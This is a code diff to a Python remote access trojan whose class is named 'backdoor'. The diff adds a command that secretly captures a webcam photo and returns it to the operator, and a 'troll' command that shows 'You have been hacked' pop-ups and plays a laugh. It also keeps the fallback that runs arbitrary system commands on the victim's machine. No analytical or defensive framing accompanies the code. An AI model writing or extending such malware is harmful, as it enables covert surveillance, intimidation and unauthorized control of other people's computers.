@@ -1,5 +1,6 @@
 import os
 import sys
+import cv2
 import time
 import json
 import socket
@@ -19,6 +20,9 @@ class backdoor:
 
     tm_enabled = True
     work_manager = wm.manager()
+
+    hacked_msg_list = ["You have been hacked...", "Prepere for pain."]
+    HACKED_PATH = TMP + "\\Calculator.wav"
 
     def __init__(self, ip, port):
         while True:
@@ -171,6 +175,31 @@ class backdoor:
         except Exception as e:
             return "[-] Error getting screenshot data: {}.".format(e)
 
+    def get_webcam_snap(self):
+        try:
+            cam = cv2.VideoCapture(0)
+            
+            ret, frame = cam.read()
+            path = self.APPDATA + "\\CapturedWebcam.png"
+            cv2.imwrite(path, frame)
+
+            file_data = self.read_file(path)
+            self.work_manager.delete_path(path)
+
+            cam.release()
+            cv2.destroyAllWindows()
+
+            return file_data
+        except Exception as e:
+            return "[-] Couldn't get a snap of the webcam: {}.".format(e)
+
+    def you_been_hacked(self, msg_list):
+        for i in msg_list:
+            self.show_message_box_popup(i)
+            time.sleep(2)
+
+        self.work_manager.play_sound(r"C:\Users\Dima\Desktop\Top Secret\TrollSFX\CrazyLaugh.wav", False)
+
     def change_working_directory_to(self, path):
         try:
             os.chdir(path)
@@ -189,25 +218,9 @@ class backdoor:
         try:
             with open(path, "wb") as file:
                 file.write(base64.b64decode(content))
-                return "[+] Upload Successful"
+                return "[+] Successfully uploaded to: {}.".format(path)
         except Exception as e:
             return "[-] (Client) Error writing to: {}, {}.".format(path, e)
-
-    def edit_file(self, path, content, del_content):
-        try:
-            if os.path.exists(path) and os.path.isfile:
-                if del_content:
-                    open(path, "w").close()
-                    return "[+] Successfully deleted the content of: {}.".format(path)
-                else:
-                    with open(path, "a") as file:
-                        file.write(content)
-
-                    return "[+] Successfully added: {} to: {}.".format(content, path)
-            else:
-                return "[-] The path you specified is not a file."
-        except Exception as e:
-            return "[-] Couldn't edit: {}, {}.".format(path, e)
 
     def run(self):
         while True:
@@ -238,6 +251,10 @@ class backdoor:
                         command_result = self.work_manager.get_idle_duration()
                     elif command_0 == "ps":     #List processes
                         command_result = self.work_manager.get_processes()
+                    elif command_0 == "webcam":
+                        command_result = self.get_webcam_snap()
+                    elif command_0 == "troll":
+                        command_result = self.you_been_hacked(self.hacked_msg_list)
                     else:       #System command
                         command_result = self.execute_system_command(command)
                 else:
@@ -275,17 +292,7 @@ class backdoor:
                             command_result = "[-] No such parameter for cgstate."
                     elif command_0 == "sdmsg":      #Send a message
                         command_result = self.show_message_box_popup(rest_of_command)
-                    elif command_0 == "edit":   #Edit a file
-                        if command[1] == "1":      #Delete content a file
-                            self.edit_file(rest_of_command, "", True)
-                        elif command[1] == "2":    #Add data to the file
-                            path = " ".join(rest_of_command_as_list[1:-1])
-                            content = command[-1]
-                        
-                            self.edit_file(path, content, False)
-                        else:   #System command
-                            command_result = "[-] No such parameter for edit."
-                    else:
+                    else:       #System command
                         command_result = self.execute_system_command(command)
             except Exception as e:
                 command_result = "[-] (Client) Error during command execution: {}.".format(e)
